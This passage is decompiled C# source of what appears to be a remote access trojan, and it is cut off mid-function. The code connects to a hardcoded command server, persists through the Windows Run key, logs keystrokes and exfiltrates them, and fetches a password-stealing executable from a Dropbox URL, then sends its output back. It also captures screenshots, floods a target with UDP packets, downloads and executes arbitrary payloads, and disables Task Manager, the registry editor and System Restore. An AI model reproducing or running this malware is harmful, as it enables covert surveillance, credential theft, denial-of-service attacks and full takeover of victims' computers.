using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using w.My;

namespace w;

public class OK
{
	public static string TIP;

	public static string Tport;

	public static int delay;

	public static bool udp;

	private static byte[] b = new byte[5121];

	public static bool BD = Conversions.ToBoolean("False");

	public static TcpClient C = null;

	public static bool Cn = false;

	public static string DR = "TEMP";

	public static string EXE = "server.exe";

	public static Computer F = new Computer();

	public static FileStream FS;

	private static string H = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(MH(HH)))));

	public static string HH = "phishing.multimilliontoken.org";

	public static bool Idr = Conversions.ToBoolean("False");

	public static bool IsF = Conversions.ToBoolean("False");

	public static bool Isu = Conversions.ToBoolean("False");

	public static kl kq = null;

	private static string lastcap = "";

	public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly().Location);

	private static MemoryStream MeM = new MemoryStream();

	public static object MT = null;

	public static int NH = 0;

	public static string P = "443";

	public static object PLG = null;

	public static string RG = "411e31664bdd9d96369d0a44d5111aef";

	public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	public static string sizk = "20";

	public static string VN = "SGFjS2Vk";

	public static string VR = "im523";

	public static string Y = "|'|'|";

	public static bool HD = Conversions.ToBoolean("False");

	public static string anti = "Exsample.exe";

	public static bool anti2 = Conversions.ToBoolean("False");

	public static bool usb = Conversions.ToBoolean("False");

	public static string usbx = "svchost.exe";

	public static bool task = Conversions.ToBoolean("True");

	public static mgr mg = null;

	[DebuggerNonUserCode]
	public OK()
	{
	}

	private static void im(object a0)
	{
		Ind((byte[])a0);
	}

	private static void im(object a0, SessionEndingEventArgs a1)
	{
		ED();
	}

	public static string ACT()
	{
		string result;
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			if (foregroundWindow == IntPtr.Zero)
			{
				return "";
			}
			string WinTitle = Strings.Space(checked(GetWindowTextLength((long)foregroundWindow) + 1));
			GetWindowText(foregroundWindow, ref WinTitle, WinTitle.Length);
			result = ENB(ref WinTitle);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = "";
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string BS(ref byte[] B)
	{
		return Encoding.UTF8.GetString(B);
	}

	public static bool Cam()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					short wDriver = (short)num;
					string lpszName = Strings.Space(100);
					string lpszVer = null;
					if (capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						return true;
					}
					num++;
				}
				while (num <= 4);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetVolumeInformationA", ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextA", ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextLengthA", ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLength(long hwnd);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	private static bool CompDir(FileInfo F1, FileInfo F2)
	{
		if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) == 0)
		{
			DirectoryInfo directoryInfo = F1.Directory;
			DirectoryInfo directoryInfo2 = F2.Directory;
			do
			{
				if (Operators.CompareString(directoryInfo.Name.ToLower(), directoryInfo2.Name.ToLower(), false) != 0)
				{
					return false;
				}
				directoryInfo = directoryInfo.Parent;
				directoryInfo2 = directoryInfo2.Parent;
				if (directoryInfo == null && directoryInfo2 == null)
				{
					return true;
				}
				if (directoryInfo == null)
				{
					return false;
				}
			}
			while (directoryInfo2 != null);
		}
		return false;
	}

	public static bool connect()
	{
		Cn = false;
		Thread.Sleep(2000);
		FileInfo lO = LO;
		lock (lO)
		{
			try
			{
				if (C != null)
				{
					try
					{
						C.Close();
						C = null;
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					MeM.Dispose();
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
			try
			{
				MeM = new MemoryStream();
				C = new TcpClient();
				C.ReceiveBufferSize = 204800;
				C.SendBufferSize = 204800;
				C.Client.SendTimeout = 10000;
				C.Client.ReceiveTimeout = 10000;
				NewLateBinding.LateCall((object)C, (Type)null, "Connect", new object[2]
				{
					RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(MH(HH)))),
					Conversions.ToInteger(P)
				}, (string[])null, (Type[])null, (bool[])null, true);
				H = Conversions.ToString(RuntimeHelpers.GetObjectValue(MH(HH)));
				Cn = true;
				Send(inf());
				try
				{
					string text = default(string);
					if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(GTV("vn", "")), (object)"", false))
					{
						text = text + DEB(ref VN) + "\r\n";
					}
					else
					{
						string text2 = text;
						string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(GTV("vn", "")));
						text = text2 + DEB(ref s) + "\r\n";
					}
					text = string.Concat(new string[20]
					{
						text + H + ":" + P + "\r\n",
						DR,
						"\r\n",
						EXE,
						"\r\n",
						Conversions.ToString(Idr),
						"\r\n",
						Conversions.ToString(IsF),
						"\r\n",
						Conversions.ToString(Isu),
						"\r\n",
						Conversions.ToString(BD),
						"\r\n",
						Conversions.ToString(HD),
						"\r\n",
						Conversions.ToString(usb),
						"\r\n",
						Conversions.ToString(anti2),
						"\r\n",
						Conversions.ToString(task)
					});
					Send("inf" + Y + ENB(ref text));
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception ex8 = ex7;
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex9)
			{
				ProjectData.SetProjectError(ex9);
				Exception ex10 = ex9;
				Cn = false;
				ProjectData.ClearProjectError();
			}
		}
		return Cn;
	}

	public static string DEB(ref string s)
	{
		byte[] B = Convert.FromBase64String(s);
		return BS(ref B);
	}

	public static void DLV(string n)
	{
		try
		{
			((ServerComputer)F).Registry.CurrentUser.OpenSubKey("Software\\" + RG, writable: true).DeleteValue(n);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void ED()
	{
		pr(0);
	}

	public static string ENB(ref string s)
	{
		return Convert.ToBase64String(SB(ref s));
	}

	public static object GTV(string n, object ret)
	{
		object result;
		try
		{
			result = ((ServerComputer)F).Registry.CurrentUser.OpenSubKey("Software\\" + RG).GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret))));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = ret;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string HWD()
	{
		string result;
		try
		{
			string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
			string lpVolumeNameBuffer = null;
			int nVolumeNameSize = 0;
			int lpMaximumComponentLength = 0;
			int lpFileSystemFlags = 0;
			string lpFileSystemNameBuffer = null;
			int lpVolumeSerialNumber = default(int);
			GetVolumeInformation(ref lpRootPathName, ref lpVolumeNameBuffer, nVolumeNameSize, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
			result = Conversion.Hex(lpVolumeSerialNumber);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			result = "ERR";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static object MH(string H)
	{
		string[] array = Strings.Split(H, ",", -1, (CompareMethod)0);
		if (NH >= array.Length)
		{
			NH = 0;
		}
		return array[NH];
	}

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "BlockInput", ExactSpelling = true, SetLastError = true)]
	public static extern int apiBlockInput(int fBlock);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long SwapMouseButton(long bSwap);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern void SendMessage(int hWnd, uint msg, uint wParam, int lparam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mciSendStringA", ExactSpelling = true, SetLastError = true)]
	public static extern long mciSendString([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpCommandString, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpReturnString, long uReturnLength, long hwndCallback);

	[DllImport("KERNEL32.DLL")]
	public static extern void Beep(int freq, int dur);

	public static void AddHome(string text)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main", writable: true);
		registryKey.SetValue("Start Page", text);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Ind(byte[] b)
	{
		//IL_12fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1304: Expected O, but got Unknown
		//IL_126e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1275: Expected O, but got Unknown
		//IL_0178: Unknown result type (might be due to invalid IL or missing references)
		//IL_0196: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0214: Unknown result type (might be due to invalid IL or missing references)
		//IL_0291: Unknown result type (might be due to invalid IL or missing references)
		//IL_0293: Unknown result type (might be due to invalid IL or missing references)
		//IL_0295: Unknown result type (might be due to invalid IL or missing references)
		//IL_0231: Unknown result type (might be due to invalid IL or missing references)
		//IL_024e: Unknown result type (might be due to invalid IL or missing references)
		//IL_026b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0288: Unknown result type (might be due to invalid IL or missing references)
		string[] array = Strings.Split(BS(ref b), Y, -1, (CompareMethod)0);
		checked
		{
			try
			{
				string text = array[0];
				string text2 = text;
				if (Operators.CompareString(text2, "nwpr", false) == 0)
				{
					Process.Start(array[1]);
				}
				else if (Operators.CompareString(text2, "site", false) == 0)
				{
					Send("site");
				}
				else if (Operators.CompareString(text2, "fun", false) == 0)
				{
					Send("fun");
				}
				else if (Operators.CompareString(text2, "IEhome", false) == 0)
				{
					AddHome(array[1]);
				}
				else if (Operators.CompareString(text2, "shutdowncomputer", false) == 0)
				{
					Interaction.Shell("shutdown -s -t 00", (AppWinStyle)0, false, -1);
				}
				else if (Operators.CompareString(text2, "restartcomputer", false) == 0)
				{
					Interaction.Shell("shutdown -r -t 00", (AppWinStyle)0, false, -1);
				}
				else if (Operators.CompareString(text2, "logoff", false) == 0)
				{
					Interaction.Shell("shutdown -l -t 00", (AppWinStyle)0, false, -1);
				}
				else if (Operators.CompareString(text2, "ErorrMsg", false) == 0)
				{
					MessageBoxIcon val = default(MessageBoxIcon);
					switch (array[1])
					{
					case "1":
						val = (MessageBoxIcon)64;
						break;
					case "2":
						val = (MessageBoxIcon)32;
						break;
					case "3":
						val = (MessageBoxIcon)48;
						break;
					case "4":
						val = (MessageBoxIcon)16;
						break;
					}
					MessageBoxButtons val2 = default(MessageBoxButtons);
					switch (array[2])
					{
					case "1":
						val2 = (MessageBoxButtons)4;
						break;
					case "2":
						val2 = (MessageBoxButtons)3;
						break;
					case "3":
						val2 = (MessageBoxButtons)0;
						break;
					case "4":
						val2 = (MessageBoxButtons)1;
						break;
					case "5":
						val2 = (MessageBoxButtons)5;
						break;
					case "6":
						val2 = (MessageBoxButtons)2;
						break;
					}
					MessageBox.Show(array[4], array[3], val2, val);
				}
				else if (Operators.CompareString(text2, "peech", false) == 0)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice", ""));
					object[] array2 = new object[1];
					string[] array3 = array;
					string[] array4 = array3;
					int num = 1;
					array2[0] = array4[num];
					object[] array5 = array2;
					object[] array6 = array5;
					bool[] array7 = new bool[1] { true };
					NewLateBinding.LateCall(objectValue, (Type)null, "speak", array6, (string[])null, (Type[])null, array7, true);
					if (array7[0])
					{
						array3[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
					}
				}
				else if (Operators.CompareString(text2, "BepX", false) == 0)
				{
					Beep((int)Math.Round(Conversion.Val(array[1])), (int)Math.Round(Conversion.Val(array[2])));
				}
				else if (Operators.CompareString(text2, "piano", false) == 0)
				{
					Beep((int)Math.Round(Conversion.Val(array[1])), 300);
				}
				else if (Operators.CompareString(text2, "OpenCD", false) == 0)
				{
					string lpCommandString = "set CDAudio door open";
					string lpReturnString = "";
					mciSendString(ref lpCommandString, ref lpReturnString, 0L, 0L);
				}
				else if (Operators.CompareString(text2, "CloseCD", false) == 0)
				{
					string lpReturnString = "set CDAudio door closed";
					string lpCommandString = "";
					mciSendString(ref lpReturnString, ref lpCommandString, 0L, 0L);
				}
				else if (Operators.CompareString(text2, "DisableKM", false) == 0)
				{
					apiBlockInput(1);
				}
				else if (Operators.CompareString(text2, "EnableKM", false) == 0)
				{
					apiBlockInput(0);
				}
				else if (Operators.CompareString(text2, "TurnOffMonitor", false) == 0)
				{
					SendMessage(-1, 274u, 61808u, 2);
				}
				else if (Operators.CompareString(text2, "TurnOnMonitor", false) == 0)
				{
					SendMessage(-1, 274u, 61808u, -1);
				}
				else if (Operators.CompareString(text2, "NormalMouse", false) == 0)
				{
					SwapMouseButton(0L);
				}
				else if (Operators.CompareString(text2, "ReverseMouse", false) == 0)
				{
					SwapMouseButton(256L);
				}
				else if (Operators.CompareString(text2, "DisableCMD", false) == 0)
				{
					((ServerComputer)MyProject.Computer).Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "EnableCMD", false) == 0)
				{
					((ServerComputer)MyProject.Computer).Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"0", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "DisableRegistry", false) == 0)
				{
					((ServerComputer)MyProject.Computer).Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"1", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "EnableRegistry", false) == 0)
				{
					((ServerComputer)MyProject.Computer).Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"0", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "DisableRestore", false) == 0)
				{
					((ServerComputer)MyProject.Computer).Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "EnableRestore", false) == 0)
				{
					((ServerComputer)MyProject.Computer).Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"0", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "DisableTaskManager", false) == 0)
				{
					((ServerComputer)MyProject.Computer).Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "EnableTaskManager", false) == 0)
				{
					((ServerComputer)MyProject.Computer).Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"0", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "CursorShow", false) == 0)
				{
					Cursor.Show();
				}
				else if (Operators.CompareString(text2, "CursorHide", false) == 0)
				{
					Cursor.Hide();
				}
				else if (Operators.CompareString(text2, "sendmusicplay", false) == 0)
				{
					File.WriteAllBytes(Path.GetTempPath() + array[1], Convert.FromBase64String(array[2]));
					Thread.Sleep(1000);
					((Computer)MyProject.Computer).Audio.Stop();
					((Computer)MyProject.Computer).Audio.Play(Path.GetTempPath() + array[1], (AudioPlayMode)1);
				}
				else if (Operators.CompareString(text2, "OpenSite", false) == 0)
				{
					Process.Start(array[1]);
				}
				else if (Operators.CompareString(text2, "dos", false) == 0)
				{
					Send("dos");
				}
				else if (Operators.CompareString(text2, "udp", false) == 0)
				{
					Send("udp");
					TIP = array[1];
					Tport = array[2];
					delay = Conversions.ToInteger(array[3]);
					udp = true;
					try
					{
						while (true && udp)
						{
							try
							{
								IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(TIP), Conversions.ToInteger(Tport));
								byte[] buffer = new byte[4096];
								Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
								socket.SendTo(buffer, remoteEP);
								Thread.Sleep(delay);
							}
							catch (Exception ex)
							{
								ProjectData.SetProjectError(ex);
								Exception ex2 = ex;
								ProjectData.ClearProjectError();
							}
						}
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "udpstp", false) == 0)
				{
					udp = false;
				}
				else if (Operators.CompareString(text2, "pingstop", false) == 0)
				{
					Interaction.Shell("taskkill /F /IM PING.EXE", (AppWinStyle)0, false, -1);
				}
				else
				{
					if (Operators.CompareString(text2, "ll", false) == 0)
					{
						Cn = false;
						return;
					}
					if (Operators.CompareString(text2, "kl", false) == 0)
					{
						Send("kl" + Y + ENB(ref kq.Logs));
						return;
					}
					switch (text2)
					{
					case "pas":
						try
						{
							string text3 = Interaction.Environ("temp") + "/pass.exe";
							if (!File.Exists(text3))
							{
								try
								{
									WebClient webClient = new WebClient();
									webClient.DownloadFile("https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0", text3);
									Process.Start(text3);
								}
								catch (Exception ex5)
								{
									ProjectData.SetProjectError(ex5);
									Exception ex6 = ex5;
									ProjectData.ClearProjectError();
								}
							}
						}
						catch (Exception ex7)
						{
							ProjectData.SetProjectError(ex7);
							Exception ex8 = ex7;
							ProjectData.ClearProjectError();
						}
						try
						{
							string path = Interaction.Environ("temp") + "/temp.txt";
							string s = File.ReadAllText(path);
							Send("pas" + Y + ENB(ref s));
							return;
						}
						catch (Exception ex9)
						{
							ProjectData.SetProjectError(ex9);
							Exception ex10 = ex9;
							ProjectData.ClearProjectError();
							return;
						}
					case "ll":
						Cn = false;
						return;
					case "kl":
						Send("kl" + Y + ENB(ref kq.Logs));
						return;
					case "prof":
						switch (array[1])
						{
						case "~":
							STV(array[2], array[3], RegistryValueKind.String);
							break;
						case "!":
							STV(array[2], array[3], RegistryValueKind.String);
							Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object)("getvalue" + Y + array[1] + Y), RuntimeHelpers.GetObjectValue(GTV(array[1], ""))))));
							break;
						case "@":
							DLV(array[2]);
							break;
						}
						return;
					}
				}
				if (Operators.CompareString(text, "rn", false) == 0)
				{
					byte[] bytes;
					if (array[2][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream = new MemoryStream();
							int length = (array[0] + Y + array[1] + Y).Length;
							memoryStream.Write(b, length, b.Length - length);
							bytes = ZIP(memoryStream.ToArray());
						}
						catch (Exception ex11)
						{
							ProjectData.SetProjectError(ex11);
							Exception ex12 = ex11;
							Exception ex13 = ex12;
							Send("MSG" + Y + "Execute ERROR");
							Send("bla");
							ProjectData.ClearProjectError();
							return;
						}
					}
					else
					{
						WebClient webClient2 = new WebClient();
						try
						{
							bytes = webClient2.DownloadData(array[2]);
						}
						catch (Exception ex14)
						{
							ProjectData.SetProjectError(ex14);
							Exception ex15 = ex14;
							Exception ex16 = ex15;
							Send("MSG" + Y + "Download ERROR");
							Send("bla");
							ProjectData.ClearProjectError();
							return;
						}
					}
					Send("bla");
					string text4 = Path.GetTempFileName() + "." + array[1];
					try
					{
						File.WriteAllBytes(text4, bytes);
						Process.Start(text4);
						Send("MSG" + Y + "Executed As " + new FileInfo(text4).Name);
						return;
					}
					catch (Exception ex17)
					{
						ProjectData.SetProjectError(ex17);
						Exception ex18 = ex17;
						Exception ex19 = ex18;
						Send("MSG" + Y + "Execute ERROR " + ex19.Message);
						ProjectData.ClearProjectError();
						return;
					}
				}
				switch (text)
				{
				case "inv":
				{
					byte[] array8 = (byte[])GTV(array[1], new byte[0]);
					if ((array[3].Length < 10) & (array8.Length == 0))
					{
						Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
						return;
					}
					if (array[3].Length > 10)
					{
						MemoryStream memoryStream4 = new MemoryStream();
						int length2 = (array[0] + Y + array[1] + Y + array[2] + Y).Length;
						memoryStream4.Write(b, length2, b.Length - length2);
						array8 = ZIP(memoryStream4.ToArray());
						STV(array[1], array8, RegistryValueKind.Binary);
					}
					Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
					object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(array8, "A"))));
					NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "h", new object[1] { H }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "p", new object[1] { P }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object)(!Cn), RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)true, false))))))
					{
						Thread.Sleep(1);
					}
					NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
					return;
				}
				case "ret":
				{
					byte[] array9 = (byte[])GTV(array[1], new byte[0]);
					if ((array[2].Length < 10) & (array9.Length == 0))
					{
						Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
						return;
					}
					if (array[2].Length > 10)
					{
						MemoryStream memoryStream5 = new MemoryStream();
						int length3 = (array[0] + Y + array[1] + Y).Length;
						memoryStream5.Write(b, length3, b.Length - length3);
						array9 = ZIP(memoryStream5.ToArray());
						STV(array[1], array9, RegistryValueKind.Binary);
					}
					Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
					object objectValue3 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(array9, "A"))));
					string[] array3 = new string[5]
					{
						"ret",
						Y,
						array[1],
						Y,
						null
					};
					string[] array10 = array3;
					string lpReturnString = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null)));
					array10[4] = ENB(ref lpReturnString);
					Send(string.Concat(array3));
					return;
				}
				case "CAP":
				{
					Rectangle bounds = Screen.PrimaryScreen.Bounds;
					Bitmap val3 = new Bitmap(Screen.PrimaryScreen.Bounds.Width, bounds.Height, (PixelFormat)135173);
					Graphics val4 = Graphics.FromImage((Image)(object)val3);
					Size size = new Size(((Image)val3).Width, ((Image)val3).Height);
					val4.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
					try
					{
						bounds = new Rectangle(size: new Size(32, 32), location: Cursor.Position);
						Cursors.Default.Draw(val4, bounds);
					}
					catch (Exception ex20)
					{
						ProjectData.SetProjectError(ex20);
						Exception ex21 = ex20;
						ProjectData.ClearProjectError();
					}
					val4.Dispose();
					Bitmap val5 = new Bitmap(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
					val4 = Graphics.FromImage((Image)(object)val5);
					val4.DrawImage((Image)(object)val3, 0, 0, ((Image)val5).Width, ((Image)val5).Height);
					val4.Dispose();
					MemoryStream memoryStream2 = new MemoryStream();
					string lpReturnString = "CAP" + Y;
					b = SB(ref lpReturnString);
					memoryStream2.Write(b, 0, b.Length);
					MemoryStream memoryStream3 = new MemoryStream();
					((Image)val5).Save((Stream)memoryStream3, ImageFormat.Jpeg);
					string text5 = md5(memoryStream3.ToArray());
					if (Operators.CompareString(text5, lastcap, false) != 0)
					{
						lastcap = text5;
						memoryStream2.Write(memoryStream3.ToArray(), 0, (int)memoryStream3.Length);
					}
					else
					{
						memoryStream2.WriteByte(0);
					}
					Sendb(memoryStream2.ToArray());
					memoryStream2.Dispose();
					memoryStream3.Dispose();
					((Image)val3).Dispose();
					((Image)val5).Dispose();
					return;
				}
				case "un":
					switch (array[1])
					{
					case "~":
						UNS();
						break;
					case "!":
						pr(0);
						ProjectData.EndApp();
						break;
					case "@":
						pr(0);
						Process.Start(LO.FullName);
						ProjectData.EndApp();
						break;
					}
					return;
				}
				switch (text)
				{
				case "up":
				{
					byte[] array13 = null;
					if (array[1][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream7 = new MemoryStream();
							int length5 = (array[0] + Y).Length;
							memoryStream7.Write(b, length5, b.Length - length5);
							array13 = ZIP(memoryStream7.ToArray());
						}
						catch (Exception ex22)
						{
							ProjectData.SetProjectError(ex22);
							Exception ex23 = ex22;
							Send("MSG" + Y + "Update ERROR");
							Send("bla");
							ProjectData.ClearProjectError();
							break;
						}
					}
					else
					{
						WebClient webClient3 = new WebClient();
						try
						{
							array13 = webClient3.DownloadData(array[1]);
						}
						catch (Exception ex24)
						{
							ProjectData.SetProjectError(ex24);
							Exception ex25 = ex24;
							Send("MSG" + Y + "Update ERROR");
							Send("bla");
							ProjectData.ClearProjectError();
							break;
						}
					}
					Send("bla");
					string text6 = Path.GetTempFileName() + ".exe";
					try
					{
						Send("MSG" + Y + "Updating To " + new FileInfo(text6).Name);
						Thread.Sleep(2000);
						File.WriteAllBytes(text6, array13);
						Process.Start(text6, "..");
					}
					catch (Exception ex26)
					{
						ProjectData.SetProjectError(ex26);
						Exception ex27 = ex26;
						ProjectData.SetProjectError(ex27);
						Exception ex28 = ex27;
						Send("MSG" + Y + "Update ERROR " + ex28.Message);
						ProjectData.ClearProjectError();
						break;
					}
					UNS();
					break;
				}
				case "Ex":
				{
					if (PLG == null)
					{
						Send("PLG");
						int num2 = 0;
						while (!(unchecked(PLG != null || num2 == 20) | !Cn))
						{
							num2++;
							Thread.Sleep(1000);
						}
						if ((PLG == null) | !Cn)
						{
							break;
						}
					}
					object[] array11 = new object[1] { b };
					bool[] array12 = new bool[1] { true };
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "ind", array11, (string[])null, (Type[])null, array12, true);
					if (array12[0])
					{
						b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array11[0]))), typeof(byte[]));
					}
					break;
				}
				case "PLG":
				{
					MemoryStream memoryStream6 = new MemoryStream();
					int length4 = (array[0] + Y).Length;
					memoryStream6.Write(b, length4, b.Length - length4);
